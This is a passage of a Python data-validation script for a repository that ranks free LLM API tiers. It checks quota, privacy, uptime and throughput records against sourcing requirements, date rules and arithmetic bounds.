            v = d.get("output_tokens_per_day")
            if v is not None and (not is_int(v) or v < 0):
                problems.append((where, "derived.output_tokens_per_day must be a non-negative integer or null, "
                                        "got %r: rank.py puts it on the DERIVED shelf as it stands" % (v,)))
            elif v is not None:
                # A derivation is never MEASURED, so above the measurement line it is refused outright.
                _daily_figure(where, "derived.output_tokens_per_day", v, "DERIVED", False, problems)
            if v is not None and d.get("confidence") != "DERIVED":
                problems.append((where, "derived.output_tokens_per_day is set but derived.confidence is %r; a "
                                        "derived figure is labelled DERIVED or rank.py ignores it, and a "
                                        "figure the code ignores and the reader sees is two shapes for one "
                                        "fact" % (d.get("confidence"),)))
            if v is not None and not one_line(d.get("how")):
                problems.append((where, "derived.output_tokens_per_day needs `how`: the arithmetic written out, "
                                        "on one line. Derived means the division is ours, and it is shown."))
    nce = p.get("neuron_cost_examples")
    if nce is not None:
        if not isinstance(nce, dict):
            problems.append((where, "neuron_cost_examples must be an object of model id -> costs"))
        else:
            for mid, cost in nce.items():
                m_where = "%s neuron_cost_examples[%s]" % (where, str(mid)[:50])
                if not isinstance(mid, str) or not MODEL_ID_OK.match(mid):
                    problems.append((m_where, "model id has an unexpected shape; it is rendered inside backticks "
                                              "on LIMITS.md"))
                if not isinstance(cost, dict):
                    problems.append((m_where, "must be an object with input_per_million and output_per_million"))
                    continue
                for f in ("input_per_million", "output_per_million"):
                    c = cost.get(f)
                    if not is_int(c) or c <= 0 or c > NEURON_COST_CEILING:
                        problems.append((m_where, "%s must be a positive integer of Neurons per million tokens, at "
                                                  "most %s, got %r. rank.py divides the daily allocation by it: "
                                                  "a fractional or zero cost is a daily figure of 10**16 or a "
                                                  "crash, and both reach the headline."
                                         % (f, NEURON_COST_CEILING, c)))
                # The division rank.py makes for this model, held to the daily rules: the allowance and
                # the price may each be under their own ceiling and still divide into a headline.
                neurons = (p.get("free_allocation") or {}).get("neurons_per_day") if isinstance(p.get("free_allocation"), dict) else None
                out_cost = cost.get("output_per_million")
                if is_int(neurons) and neurons > 0 and is_int(out_cost) and 0 < out_cost <= NEURON_COST_CEILING:
                    _daily_figure(m_where, "free_allocation.neurons_per_day / output_per_million x 1,000,000",
                                  int(neurons / out_cost * 1000000), "DERIVED", False, problems)
    for block in TYPED_BLOCKS:
        b = p.get(block)
        if b is None:
            continue
        if not isinstance(b, dict):
            problems.append((where, "%s must be an object" % block))
            continue
        for k, v in b.items():
            if k in BLOCK_TEXT_KEYS or k in LIMIT_KEYS:
                continue            # text is held by _walk_page_text, LIMIT_KEYS by _walk_figures
            figure_ceiling = daily_ceilings()["figure"]
            if v is not None and (not is_num(v) or v < 0 or v > figure_ceiling):
                problems.append((where, "%s.%s must be a non-negative number or null under %s, got %r: every "
                                        "figure under %s is one rank.py may read into a daily number, and the "
                                        "ceiling is the project's whole target" % (block, k, figure_ceiling, v, block)))
            elif v is not None and block == "measured_values":
                _daily_figure(where, "%s.%s" % (block, k), v, p.get("confidence"),
                              is_text(p.get("measured_how")), problems)


def _check_daily_shelf(where, p, am, models, conf, measured_ok, problems):
    """Every figure bench/rank.py's volume_of() can put on the daily shelf, read the way it reads them:
    tpd as it stands, rpd times the tokens a reply, from all_models or from the model's own entry, each
    with the confidence rank.py would give it (the figure's own `_confidence`, else the provider's) -
    held to the target and to the measurement line. free_models_combined tiers carry rpd the same way."""
    reply = daily_ceilings()["tokens_per_reply"]
    entries = [("all_models", am, conf, measured_ok)] if isinstance(am, dict) else []
    for mid, m in (models or {}).items():
        if isinstance(m, dict):
            m_measured = is_text(m.get("measured_how")) and is_iso_date(m.get("measured_on"))
            entries.append(("model %s" % str(mid)[:50], m, None, m_measured or measured_ok))
    fmc = p.get("free_models_combined")
    if isinstance(fmc, dict):
        for tier, t in fmc.items():
            if isinstance(t, dict):
                entries.append(("free_models_combined.%s" % str(tier)[:30], t, None, measured_ok))
    for label, e, own_conf, how_ok in entries:
        for k in DAILY_KEYS:
            v = e.get(k)
            if not is_int(v) or v <= 0:
                continue
            k_conf = e.get(k + "_confidence") or own_conf or conf
            tokens = v if k == "tpd" else v * reply
            if tokens > daily_ceilings()["target"]:
                continue        # already refused by _walk_figures, with the target named in its message
            _daily_figure("%s %s" % (where, label) if label != "all_models" else where,
                          ("all_models.%s" % k) if label == "all_models" else k,
                          tokens, k_conf, how_ok, problems,
                          unit=("tokens a day" if k == "tpd" else "requests a day x %d tokens a reply" % reply))


def check_limits(path, problems, provider_names=None, hosts=None):
    """Returns the parsed file, for the throughput and draw checks that compare against it. None on
    failure. `hosts` maps provider name -> API host and switches on the own-domain rule for sources."""
    d = load_json(path, problems)
    if d is None:
        return None
    provs = d.get("providers")
    if not isinstance(provs, dict) or not provs:
        problems.append((path.name, "providers must be a non-empty object"))
        return d
    for name, p in provs.items():
        where = "%s: %s" % (path.name, name)
        if provider_names is not None and name not in provider_names:
            problems.append((where, "not a provider in providers.json; a quota for an endpoint nobody "
                                    "calls is data nobody can check"))
        if not isinstance(p, dict):
            problems.append((where, "must be an object"))
            continue
        if hosts and hosts.get(name):
            _walk_sources(where, p, problems, own_domains(name, hosts[name]))
        _walk_page_text(where, p, problems)
        _check_typed_blocks(where, p, problems)
        conf = p.get("confidence")
        if conf not in CONFIDENCE:
            problems.append((where, "confidence must be MEASURED, DECLARED or UNKNOWN, got %r" % conf))
        declared_ok, measured_ok = _evidence(p)
        if conf == "DECLARED":
            if not is_https_url(p.get("source")):
                problems.append((where, "DECLARED needs source: one https URL, nothing else glued to it. "
                                        "That is what makes it checkable."))
            if not is_iso_date(p.get("read_on")):
                problems.append((where, "DECLARED needs read_on as a date, YYYY-MM-DD: an undated reading "
                                        "of a page that changes is a rumour"))
        elif conf == "MEASURED":
            if not is_iso_date(p.get("measured_on")):
                problems.append((where, "MEASURED needs measured_on as a date: an undated measurement is a rumour"))
            if not is_text(p.get("measured_how")):
                problems.append((where, "MEASURED needs measured_how: which header, which endpoint, which "
                                        "429. A measurement with no method cannot be repeated."))
        elif p.get("source") is not None and not is_https_url(p.get("source")):
            problems.append((where, "source must be one https URL"))
        for f in ("read_on", "measured_on"):
            if conf not in ("DECLARED", "MEASURED") and p.get(f) is not None and not is_iso_date(p[f]):
                problems.append((where, "%s must be a date, YYYY-MM-DD" % f))

        _walk_figures(where, p, problems)

        am = p.get("all_models")
        if am is not None and not isinstance(am, dict):
            problems.append((where, "all_models must be an object"))
            am = None
        if isinstance(am, dict) and "tpm_scope" in am and am["tpm_scope"] not in TPM_SCOPES:
            problems.append((where, "all_models.tpm_scope must be one of %s: it says whether a bare tpm counts "
                                    "input and output together, output alone, or does not say, and the pages "
                                    "print it next to the figure" % sorted(TPM_SCOPES)))
        models = p.get("models")
        if models is not None and not isinstance(models, dict):
            problems.append((where, "models must be an object of model id -> figures"))
            models = None
        _check_daily_shelf(where, p, am, models, conf, measured_ok, problems)

        # UNKNOWN carries no figures. A number under UNKNOWN is ranked by rank.py exactly like a
        # measured one - a trillion tokens a day took the top three rows of the README that way.
        if conf == "UNKNOWN":
            for k, v in (am or {}).items():
                if k in LIMIT_KEYS and v is not None:
                    problems.append((where, "confidence is UNKNOWN but all_models.%s is %s. Unknown means no "
                                            "figure: the ranking would treat this number as real." % (k, v)))

        paid_plan_anywhere = False
        for mid, m in (models or {}).items():
            m_where = "%s model %s" % (where, str(mid)[:50])
            if not isinstance(mid, str) or not MODEL_ID_OK.match(mid):
                problems.append((m_where, "model id has an unexpected shape; it is rendered inside backticks "
                                          "in the per-model table on LIMITS.md"))
            if not isinstance(m, dict):
                problems.append((m_where, "must be an object"))
                continue
            m_declared, m_measured = _evidence(m)
            for k, v in m.items():
                if not k.endswith("_confidence"):
                    continue
                base = k[:-len("_confidence")]
                if base not in LIMIT_KEYS:
                    problems.append((m_where, "%s names a figure the ranking does not read" % k))
                if v not in CONFIDENCE:
                    problems.append((m_where, "%s must be MEASURED, DECLARED or UNKNOWN, got %r" % (k, v)))
                elif v == "MEASURED" and not (m_measured or measured_ok):
                    problems.append((m_where, "%s is MEASURED but neither this model nor the provider "
                                              "carries measured_on (a date) and measured_how. A "
                                              "measurement with no date and no method is a number "
                                              "somebody typed." % k))
                elif v == "DECLARED" and not (m_declared or declared_ok):
                    problems.append((m_where, "%s is DECLARED but neither this model nor the provider "
                                              "carries an https source and a read_on date" % k))
            if conf == "UNKNOWN":
                for k, v in m.items():
                    if k in LIMIT_KEYS and v is not None and m.get(k + "_confidence") not in ("MEASURED", "DECLARED"):
                        problems.append((m_where, "provider confidence is UNKNOWN and %s is %s with no %s_confidence "
                                                  "of its own: a figure under UNKNOWN is a figure the ranking "
                                                  "believes" % (k, v, k)))
            # Per-minute ceilings have ONE shape: bench/throughput.py and the per-minute tables in
            # rank.py read all_models only. Per-model detail may stay under models, and then the file's
            # own header says all_models carries the largest of them - so the two must agree.
            pm = sorted(k for k in m if k in PER_MINUTE_KEYS and m[k] is not None)
            if pm and am is None:
                problems.append((m_where, "per-minute figures (%s) sit under models, and this provider has "
                                          "no all_models block. The throughput test and the per-minute "
                                          "tables read all_models ONLY, so these numbers are invisible to "
                                          "the code and visible to the reader: two shapes for one fact. "
                                          "Per-minute ceilings live in all_models." % ", ".join(pm)))
            elif pm:
                for k in pm:
                    if is_int(m[k]) and (not is_int(am.get(k)) or am[k] < m[k]):
                        problems.append((m_where, "%s is %s here and %r in all_models. all_models carries the "
                                                  "largest per-model figure, by the file's own rule; the "
                                                  "code reads only that one." % (k, m[k], am.get(k))))
            if m.get("rpd_is_paid_plan") is not None and not isinstance(m["rpd_is_paid_plan"], bool):
                problems.append((m_where, "rpd_is_paid_plan must be true or false"))
            if m.get("rpd_is_paid_plan") is True:
                paid_plan_anywhere = True
                if not is_text(m.get("rpd_plan")) and not is_text(p.get("rpd_plan")):
                    problems.append((m_where, "rpd_is_paid_plan is true, so rpd_plan must name the plan (on the "
                                              "model or on the provider): a paid figure with no plan name "
                                              "reads as a free one"))
        if isinstance(am, dict) and am.get("rpd_is_paid_plan") is True:
            paid_plan_anywhere = True
            if not is_text(am.get("rpd_plan")) and not is_text(p.get("rpd_plan")):
                problems.append((where, "all_models.rpd_is_paid_plan is true, so rpd_plan must name the plan"))
        if p.get("rpd_plan") is not None and not paid_plan_anywhere:
            problems.append((where, "rpd_plan is set but nothing is marked rpd_is_paid_plan: which figure "
                                    "is the paid one?"))

        # The two grant shelves, one-time and monthly, get the same evidence rule as each other.
        for shelf in ("one_time", "monthly"):
            if p.get(shelf) is not None:
                _check_grant(where, shelf, p[shelf], problems)

        # A recurring credit in money written as a `credits` block gets the same evidence rule.
        cr = p.get("credits")
        if cr is not None:
            if not isinstance(cr, dict):
                problems.append((where, "credits must be an object"))
            else:
                if not is_https_url(cr.get("source")) or not is_iso_date(cr.get("read_on")) or not is_text(cr.get("quote")):
                    problems.append((where, "a credits block needs an https source, a read_on date and the "
                                            "provider's own quote: a monthly allowance in money is the "
                                            "figure a reader budgets on"))
                for f in ("usd_per_month", "usd"):
                    if cr.get(f) is not None and (not is_num(cr[f]) or cr[f] < 0 or cr[f] > GRANT_CEILINGS[f]):
                        problems.append((where, "credits.%s must be a non-negative number under %s"
                                         % (f, GRANT_CEILINGS[f])))

        blob = json.dumps(p)
        if re.search(r"(?i)(x\s*\d+\s*(keys|accounts)|\d+\s*(keys|accounts)\s*[x*])", blob):
            problems.append((where, "a limit multiplied across keys or accounts. Most limits apply per "
                                    "account or per organization, so it is usually false, and it reads "
                                    "as advice to evade a quota."))
    return d


# ---------------------------------------------------------------- privacy.json

def check_privacy(path, problems, providers):
    """privacy.json says whether a provider trains on your prompts.

    Its own header states the stakes: "inventing a no here would be the most damaging kind of wrong
    answer this repo could publish: somebody sends customer data on the strength of it". A field that
    can send someone's customer data to a training set does not get to be an unsourced opinion, so:

      - anything other than UNKNOWN needs a source on the provider's OWN domain (the API domain, a
        declared sign-up host or a declared terms host), a read_on date, and at least one verbatim
        quote;
      - a "no" - the answer that invites trust - needs a quote that actually contains a negation, as
        a whole word, so the sentence a reader would want to see is on the page rather than in our
        summary of it.
    """
    if not path.exists():
        problems.append((path.name, "privacy.json is missing; the privacy column would publish blanks"))
        return
    d = load_json(path, problems)
    if d is None:
        return
    hosts = hosts_of(providers)
    claims = ("trains_on_free_tier", "logs_prompts", "human_review", "retention", "region_restriction")
    provs = d.get("providers")
    if not isinstance(provs, dict):
        problems.append((path.name, "providers must be an object"))
        return
    for name, p in provs.items():
        where = "%s: provider %r" % (path.name, name)
        if name not in hosts:
            problems.append((where, "not a provider in providers.json"))
        if not isinstance(p, dict):
            problems.append((where, "must be an object"))
            continue
        stated = {k: v for k, v in p.items() if k in claims and str(v).strip().upper() != "UNKNOWN"}
        if not stated:
            continue
        src, read_on = p.get("source", ""), p.get("read_on", "")
        quotes = [q for q in (p.get("quotes") or []) if isinstance(q, str) and q.strip()]
        if not is_https_url(src):
            problems.append((where, "states %s but has no https source. An unsourced privacy claim is "
                                    "the one kind of wrong answer in this repo that can cost a reader "
                                    "their customers' data." % ", ".join(sorted(stated))))
        elif name in hosts:
            own = own_domains(name, hosts[name])
            if registrable(host_of(src)) not in own:
                problems.append((where, "source is on %s, which is not this provider's domain (%s). A privacy "
                                        "claim is backed by the provider's own terms, on the provider's own "
                                        "site; a page anywhere else is somebody's summary. If they genuinely "
                                        "publish their terms on that domain, add it to KNOWN_TERMS_HOSTS in "
                                        "this gate, in the same pull request."
                                 % (host_of(src), ", ".join(sorted(own)))))
        if not is_iso_date(read_on):
            problems.append((where, "needs read_on as a date, YYYY-MM-DD: terms change, and an undated "
                                    "reading of them is a rumour about a moving target"))
        if not quotes:
            problems.append((where, "states %s with no verbatim quote. The quote IS the evidence; our "
                                    "paraphrase is not." % ", ".join(sorted(stated))))
        for field, value in stated.items():
            if str(value).strip().lower() == "no":
                if not any(NEGATION.search(q) for q in quotes):
                    problems.append((where, "answers 'no' to %s, but not one quoted sentence contains a "
                                            "negation. A 'no' is the answer people act on; it has to be "
                                            "their words, not ours." % field))


# ---------------------------------------------------------------- announced_deaths.json

def check_announced_deaths(path, problems, providers):
    """Rendered raw into GRAVEYARD.md by gate_viability.py: a heading, a blockquote, a source line.
    So every field is one line with nothing in it that markdown would turn into structure or a link,
    and the provider it retires may not be one this repo is still benchmarking."""
    if not path.exists():
        return
    d = load_json(path, problems)
    if d is None:
        return
    entries = d.get("providers")
    if not isinstance(entries, list):
        problems.append((path.name, "providers must be a list"))
        return
    live = {str(n).lower() for n in models_of(providers)}
    for i, e in enumerate(entries):
        where = "%s: entry %d" % (path.name, i + 1)
        if not isinstance(e, dict):
            problems.append((where, "must be an object"))
            continue
        where = "%s: %r" % (path.name, str(e.get("provider", "<unnamed>"))[:40])
        prov = e.get("provider")
        if not isinstance(prov, str) or not DEATH_NAME_OK.match(prov):
            problems.append((where, "provider must be one short line of ASCII letters, digits, spaces, hyphens, "
                                    "periods and parentheses, with no markdown in it: it becomes a heading, "
                                    "and a lookalike letter from another alphabet is how a live provider's "
                                    "name gets buried under a homoglyph."))
            prov = None
        elif prov.strip().lower() in live:
            problems.append((where, "is still a provider in providers.json. An endpoint cannot be benchmarked "
                                    "and announced dead in the same repo; a retirement notice that buries a "
                                    "live provider is the shape of the attack this file invites."))
        else:
            named = sorted(n for n in live if n in {w for w in re.split(r"[^a-z0-9]+", prov.lower()) if w})
            if named:
                problems.append((where, "names %r, which is still a provider in providers.json. A headstone that "
                                        "carries a live provider's name with a word added is the same burial "
                                        "under a longer name." % named[0]))
        for f in ("died_on", "read_on"):
            if not is_iso_date(e.get(f)):
                problems.append((where, "%s must be a date, YYYY-MM-DD" % f))
        author = e.get("notice_from")
        if author not in NOTICE_AUTHORS:
            problems.append((where, "notice_from must be %s, got %r: whose word the death is decides where the "
                                    "notice may sit" % (" or ".join(repr(a) for a in NOTICE_AUTHORS), author)))
        if not is_https_url(e.get("source")):
            problems.append((where, "source must be one https URL: the notice is the evidence"))
        elif author == "operator":
            own = KNOWN_OPERATOR_HOSTS.get(prov.strip().lower(), set()) if prov else set()
            if registrable(host_of(e["source"])) not in own:
                problems.append((where, "notice_from is operator and source is on %s, which is not a domain this "
                                        "gate ties to %r (%s). An operator's retirement notice sits on the "
                                        "operator's own site; a paste site or a blog nobody can tie to the "
                                        "operator is somebody's summary of a death. If the operator genuinely "
                                        "published there, add the domain to KNOWN_OPERATOR_HOSTS in this gate, "
                                        "in the same pull request." % (host_of(e["source"]), prov or "<unnamed>",
                                                                       ", ".join(sorted(own)) or "no domain declared")))
        elif author == "third party":
            if registrable(host_of(e["source"])) not in KNOWN_NEWS_HOSTS:
                problems.append((where, "notice_from is third party and source is on %s, which is not one of the "
                                        "declared news hosts (%s). A third party's report of a death is admitted "
                                        "only from a host declared in KNOWN_NEWS_HOSTS in this gate; a paste "
                                        "site is not a newsroom." % (host_of(e["source"]), ", ".join(sorted(KNOWN_NEWS_HOSTS)))))
        q = e.get("quote")
        if not one_line(q) or len(q) > 600:
            problems.append((where, "quote must be one line of at most 600 characters: it is rendered as a "
                                    "blockquote, and a second line leaves the quote"))
        elif page_text_problem(q):
            problems.append((where, "quote %s. It is rendered raw as a blockquote on GRAVEYARD.md, where a link, "
                                    "a tag or a bracket becomes structure a reader clicks; the operator's "
                                    "sentence does not need it." % page_text_problem(q)))
        et = e.get("endpoint_today")
        if not one_line(et) or len(et) > 300:
            problems.append((where, "endpoint_today must be one line, under 300 characters"))
        elif page_text_problem(et):
            problems.append((where, "endpoint_today %s. It is rendered raw onto GRAVEYARD.md; what the endpoint "
                                    "answers is a status code and a sentence, not a link." % page_text_problem(et)))


# ---------------------------------------------------------------- data/uptime.jsonl

def down_http_ok(http):
    """The codes a `down` row may carry: no response (0 or null) or a server error other than 503,
    which the radar files as `overloaded`. A 2xx, 3xx or 4xx is the endpoint answering, and an endpoint
    that answers is not down, whatever the row says - fourteen `down` rows with http 500 buried a live
    endpoint under the previous rule, which refused only the codes other states claim."""
    return http is None or http == 0 or (500 <= http <= 599 and http not in STATE_HTTP["overloaded"])


def check_uptime(path, problems, providers, label="data/uptime.jsonl", today=None):
    """The radar's history decides burials, so a row is refused unless it could have been written by
    bench/probe_alive.py: a known endpoint, a known state, a status code that matches the state, a date
    that has happened, filed in date order - the radar appends the whole day at once, so a row dated
    before the newest date on file is back-dated - and one reading per endpoint-day, the rule
    gate_viability.py applies to the same file."""
    if not path.exists():
        return
    today = today or today_utc()
    known = models_of(providers)
    ledger = _new_ledger()
    for n, r in read_jsonl(path, label, problems):
        where = "%s:%d" % (label, n)
        missing = [k for k in ("date", "provider", "model", "state", "http", "seconds") if k not in r]
        if missing:
            problems.append((where, "row lacks %s" % ", ".join(missing)))
            continue
        if not is_iso_date(r["date"]):
            problems.append((where, "date must be YYYY-MM-DD, got %r" % (r["date"],)))
        elif after_today(r["date"], today):
            problems.append((where, "date %s is after today (%s). A measurement from the future is a row nobody "
                                    "took, and the burial clock counts from the latest date in this file, so "
                                    "fourteen rows dated next year bury an endpoint today." % (r["date"], today)))
        else:
            _in_date_order(where, label, (str(r["provider"]), str(r["model"])), r["date"], ledger, problems,
                           one_per_day=r["state"] not in UPTIME_NOT_A_VERDICT, what="The radar")
        prov, model, state, http, secs = r["provider"], r["model"], r["state"], r["http"], r["seconds"]
        if prov not in known:
            problems.append((where, "provider %r is not in providers.json" % (prov,)))
        elif model not in known[prov]:
            problems.append((where, "model %r is not one of %r's models in providers.json. A row about an "
                                    "endpoint nobody probes is a row nobody measured." % (model, prov)))
        if state not in UPTIME_STATES:
            problems.append((where, "state %r is not one the radar writes (%s)"
                             % (state, ", ".join(sorted(UPTIME_STATES)))))
            continue
        if http is not None and not is_int(http):
            problems.append((where, "http must be an integer or null"))
            continue
        if state == "down":
            if not down_http_ok(http):
                filed = next((s for s, c in STATE_HTTP.items() if http in c), None)
                problems.append((where, "state is down with http %r. down starts the fourteen-day burial clock, "
                                        "so it is accepted only with the codes the radar writes it with: 0 or "
                                        "null for no response, or a 5xx other than 503. %s"
                                 % (http, ("The radar files %s as %s." % (http, filed)) if filed else
                                    "A 2xx, 3xx or 4xx is the endpoint answering, and an endpoint that "
                                    "answers is not down.")))
        elif http not in STATE_HTTP[state]:
            problems.append((where, "state %s is written with http %s, got %r"
                             % (state, "/".join(str(c) for c in sorted(STATE_HTTP[state], key=str)), http)))
        if state == "no_key":
            if secs is not None:
                problems.append((where, "a no_key row has no timing"))
        elif not is_num(secs) or secs < 0:
            problems.append((where, "seconds must be a non-negative number, got %r" % (secs,)))
        if "note" in r and not isinstance(r["note"], str):
            problems.append((where, "note must be a string"))


# ---------------------------------------------------------------- data/throughput.jsonl

def published_tpm(lim, prov):
    """The per-minute output ceiling a provider publishes in limits.json, or None. tpm counts input and
    output together, so it is an upper bound on output; tpm_output is the bound itself."""
    am = (lim.get(prov) or {}).get("all_models") if isinstance(lim.get(prov), dict) else None
    if not isinstance(am, dict):
        return None
    return am.get("tpm") if is_int(am.get("tpm")) else am.get("tpm_output") if is_int(am.get("tpm_output")) else None


def check_throughput(path, problems, providers, limits, label="data/throughput.jsonl", today=None):
    """The front page's "tokens a minute" is the sum of the latest row per provider here, so a row is
    refused unless bench/throughput.py could have produced it: the fields it writes, counts that add
    up, no more tokens than the requests could have carried at the meter's own max_tokens, a rate that
    follows from the tokens and the seconds by its own two rules, and never above a ceiling the
    provider publishes."""
    if not path.exists():
        return
    _, T = _meters()
    today = today or today_utc()
    known = models_of(providers)
    lim = ((limits or {}).get("providers") or {}) if isinstance(limits, dict) else {}
    ledger = _new_ledger()
    for n, r in read_jsonl(path, label, problems):
        where = "%s:%d" % (label, n)
        prov = r.get("provider")
        if prov not in known:
            problems.append((where, "provider %r is not in providers.json" % (prov,)))
            continue
        if not is_iso_date(r.get("date")):
            problems.append((where, "date must be YYYY-MM-DD, got %r" % (r.get("date"),)))
        elif after_today(r["date"], today):
            problems.append((where, "date %s is after today (%s): a measurement from the future is a row nobody "
                                    "took, and rank.py takes the LATEST row per provider" % (r["date"], today)))
        elif "skipped" not in r:
            # In date order, because rank.py keeps the LAST row per provider in file order: a row appended
            # with an earlier date would still be the one on the page. Two readings of one endpoint on one
            # day are what bench/throughput.py --only writes when it is run twice, and rank.py counts every
            # row as a reading (best_seen, holds_up), so the day is not unique here as it is for the radar.
            _in_date_order(where, label, (str(prov), str(r.get("model"))), r["date"], ledger, problems,
                           one_per_day=False, what="bench/throughput.py")
        if "skipped" in r:
            # The runner writes {"provider", "skipped", "date"} when it could not measure: nothing else.
            extra = sorted(set(r) - {"provider", "skipped", "date"})
            if not one_line(r["skipped"]) or extra:
                problems.append((where, "a skipped row carries provider, skipped and date only"))
            continue
        missing = [k for k in THROUGHPUT_FIELDS if k not in r]
        if missing:
            problems.append((where, "row lacks %s" % ", ".join(missing)))
            continue
        if "tokens_estimated" in r:
            if not isinstance(r["tokens_estimated"], bool):
                problems.append((where, "tokens_estimated must be true or false"))
        elif not is_iso_date(r["date"]) or date.fromisoformat(r["date"]) >= THROUGHPUT_ESTIMATED_FLAG_SINCE:
            problems.append((where, "row lacks tokens_estimated. Rows written from %s on say whether their count "
                                    "came from the provider's usage block or from words x 1.3; without the "
                                    "flag a reader cannot tell a measurement from an estimate. Only rows "
                                    "older than that are read as their count." % THROUGHPUT_ESTIMATED_FLAG_SINCE))
        if r["model"] not in known[prov]:
            problems.append((where, "model %r is not one of %r's models in providers.json" % (r["model"], prov)))
        for k in ("concurrency", "requests_ok", "requests_rate_limited", "requests_failed", "output_tokens"):
            if not is_int(r[k]) or r[k] < 0 or (k == "concurrency" and r[k] < 1):
                problems.append((where, "%s must be a non-negative integer, got %r" % (k, r[k])))
        if is_int(r["concurrency"]) and r["concurrency"] > T.MAX_CONCURRENCY:
            problems.append((where, "concurrency %d is above the %d the meter never exceeds" % (r["concurrency"], T.MAX_CONCURRENCY)))
        if not is_num(r["seconds"]) or r["seconds"] < 0:
            problems.append((where, "seconds must be a non-negative number"))
        for k in ("rate_basis", "stopped_because", "note"):
            if not one_line(r[k]):
                problems.append((where, "%s must be one line of text" % k))
        if r.get("first_error") is not None and not one_line(r["first_error"]):
            problems.append((where, "first_error must be one line of text or null"))
        rate = r["tokens_per_minute_measured"]
        if rate is not None and (not is_int(rate) or rate < 0):
            problems.append((where, "tokens_per_minute_measured must be a non-negative integer or null"))
            continue
        ok, limited, tokens, secs = r["requests_ok"], r["requests_rate_limited"], r["output_tokens"], r["seconds"]
        if not all(is_int(x) and x >= 0 for x in (ok, limited, tokens)) or not is_num(secs):
            continue
        if tokens and not ok:
            problems.append((where, "%d output tokens from zero successful requests" % tokens))
        # A slot completes one request at a time, so the slots bound the requests before the requests
        # bound the tokens: 20,000 answers in 30.8 seconds on 8 slots carried fourteen million tokens
        # through the per-call bound, because that bound grows with the count this one caps.
        failed = r["requests_failed"] if is_int(r["requests_failed"]) and r["requests_failed"] >= 0 else 0
        if is_int(r["concurrency"]) and 1 <= r["concurrency"] <= T.MAX_CONCURRENCY and secs >= 0:
            launch_bound = int(r["concurrency"] * (secs * MAX_REQUESTS_PER_SLOT_SECOND + 1) + 1e-9)
            if ok + limited + failed > launch_bound:
                problems.append((where, "%d requests in %.1f seconds on %d slots. A slot completes one request at a "
                                        "time and no endpoint answers a slot more than %d times a second, so at "
                                        "most concurrency x (seconds x %d + 1) = %d could have completed; this row "
                                        "holds more requests than the meter could have sent."
                                 % (ok + limited + failed, secs, r["concurrency"], MAX_REQUESTS_PER_SLOT_SECOND,
                                    MAX_REQUESTS_PER_SLOT_SECOND, launch_bound)))
        # The meter asks for at most MAX_TOKENS_PER_CALL tokens a call, so the requests that succeeded
        # bound the tokens that can have arrived - with or without a published ceiling. A row with a
        # billion tokens from one request on a provider that publishes no tpm passed the second version.
        per_call_bound = int(ok * T.MAX_TOKENS_PER_CALL * (1 + T.USAGE_OVERSHOOT))
        if tokens > per_call_bound:
            problems.append((where, "%d output tokens from %d successful requests. The meter asks for at most %d "
                                    "tokens a call, so %d requests cannot have carried more than %d even with the "
                                    "%d%% a usage block may count past max_tokens; this row holds more than the "
                                    "meter could have received."
                             % (tokens, ok, T.MAX_TOKENS_PER_CALL, ok, per_call_bound, round(T.USAGE_OVERSHOOT * 100))))
        if rate is None:
            continue
        # The two rules bench/throughput.py states for the rate, applied backwards.
        if limited:
            if rate != tokens:
                problems.append((where, "a 429 stopped this run, so the rate is the tokens that arrived before "
                                        "it (%d), not %d: a rate scaled up from a refused minute is the "
                                        "number this file exists to refuse" % (tokens, rate)))
        else:
            if secs < MIN_WINDOW_SECONDS:
                problems.append((where, "a rate is stated from a %.1f-second window; under %d seconds the "
                                        "runner states none" % (secs, MIN_WINDOW_SECONDS)))
            else:
                expected = tokens / secs * 60
                if abs(rate - expected) > RATE_TOLERANCE * max(rate, expected) + 2:
                    problems.append((where, "tokens_per_minute_measured is %s, but %d tokens over %s seconds "
                                            "scale to %.0f. The headline on the front page is the sum of "
                                            "these rates; one that does not follow from its own row is a "
                                            "number, not a measurement." % (rate, tokens, secs, expected)))
                meter_ceiling = per_call_bound / secs * 60
                if rate > meter_ceiling * (1 + RATE_TOLERANCE) + 2:
                    problems.append((where, "measured %s tokens a minute from %d successful requests over %s "
                                            "seconds; at %d tokens a call the meter cannot have seen more "
                                            "than %.0f a minute. This bound holds whether or not the provider "
                                            "publishes a ceiling." % (rate, ok, secs, T.MAX_TOKENS_PER_CALL, meter_ceiling)))
        ceiling = published_tpm(lim, prov)
        if ceiling is not None and rate > ceiling:
            problems.append((where, "measured %s tokens a minute, above the %s the provider publishes as its "
                                    "ceiling in limits.json. One of the two numbers is wrong, and the gate "
                                    "cannot tell which - so neither ships." % (rate, ceiling)))


# ---------------------------------------------------------------- data/drawn.jsonl

def _usage_overshoot():
    """The tolerance bench/throughput.py states for a usage block counting past max_tokens. Read at run
    time because throughput.py imports this gate for ALLOWED_HOSTS, so the gate cannot import it at load."""
    import throughput as _T  # noqa: E402
    return _T.USAGE_OVERSHOOT


def check_drawn(path, problems, providers, limits, label="data/drawn.jsonl", today=None):
    """The hour-long draw is the largest single figure on the front-page bar: rank.py multiplies
    `tokens_per_hour_drawn` by 24 and sums it. One appended row with tokens_per_hour_drawn 1e9 put
    24,000,000,000 tokens a day on the headline with every check green, because nothing opened this
    file. A row is refused unless bench/draw_day.py could have written it, and the bounds are the
    meter's own, imported from it:

      - every field the meter writes, a known endpoint, a date that has happened;
      - a pace no faster than the meter allows for that provider: its published rpm, the default
        where none is published, never above the safety ceiling;
      - no more requests than the metronome could have launched in the minutes run, and no more
        tokens than the successful requests could have carried at max_tokens a call;
      - no more tokens than the cap the run names, plus the calls in flight when it closed, and no
        cap above the most --cap may ask for;
      - an hourly rate only where the meter's own rule states one (twenty minutes, or a cap reached
        after five minutes and fifty successful requests), equal to tokens / minutes x 60 within 3%,
        and never above sixty times a per-minute ceiling the provider publishes;
      - `tokens_estimated` true or false, so a reader can tell their count from ours;
      - in date order, one draw per endpoint-day: rank.py keeps the LAST row per provider in file
        order, so a back-dated or a second same-day row would silently replace the day's draw.
    """
    if not path.exists():
        return
    D, _ = _meters()
    today = today or today_utc()
    known = models_of(providers)
    lim = ((limits or {}).get("providers") or {}) if isinstance(limits, dict) else {}
    in_flight_slack = D.MAX_IN_FLIGHT * D.MAX_TOKENS_PER_CALL
    ledger = _new_ledger()
    for n, r in read_jsonl(path, label, problems):
        where = "%s:%d" % (label, n)
        missing = [k for k in D.ROW_FIELDS if k not in r]
        if missing:
            problems.append((where, "row lacks %s: bench/draw_day.py writes every one of them, so a row without "
                                    "them is a row it did not write" % ", ".join(missing)))
            continue
        prov, model = r["provider"], r["model"]
        if prov not in known:
            problems.append((where, "provider %r is not in providers.json" % (prov,)))
            continue
        if model not in known[prov]:
